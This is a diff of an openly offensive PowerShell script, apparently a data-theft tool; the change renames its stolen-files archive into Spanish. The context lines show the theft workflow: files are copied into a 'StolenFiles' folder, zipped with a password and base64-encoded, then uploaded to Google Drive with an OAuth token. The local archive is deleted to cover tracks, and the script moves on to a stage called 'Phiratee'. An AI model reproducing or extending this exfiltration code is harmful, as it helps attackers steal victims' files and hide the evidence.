@@ -140,7 +140,7 @@ For($i = 1; $i -le $files.count; $i++)
 
 $files | Select name
 Write-Host "[+] Files copied" -ForegroundColor Green
-Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\steal-$env:computername-Content$(get-date -f yyyy-MM-dd).zip -Format Zip -Password "$pwd1"
+Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\ArchivosRobados-$env:computername-Content$(get-date -f yyyy-MM-dd).zip -Format Zip -Password "$pwd1"
 
 Start-Sleep -s 2
 Write-Host "[+] Files zipped" -ForegroundColor Green
@@ -168,7 +168,7 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$FileEncrypted = 'c:\temp\steal-$env:computername-Content$(get-date -f yyyy-MM-dd).zip'
+$FileEncrypted = 'c:\temp\ArchivosRobados-$env:computername-Content$(get-date -f yyyy-MM-dd).zip'
 
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item $FileEncrypted
@@ -216,7 +216,7 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
 Start-Sleep -s 3
-Remove-Item c:\temp\steal-$env:computername-Content$(get-date -f yyyy-MM-dd).zip
+Remove-Item c:\temp\ArchivosRobados-$env:computername-Content$(get-date -f yyyy-MM-dd).zip
 Start-Sleep -s 2
 Write-Host "[-] Stolen file deleted from the host..." -ForegroundColor Red
 Write-Host "[+] Init Phiratee..." -ForegroundColor Green
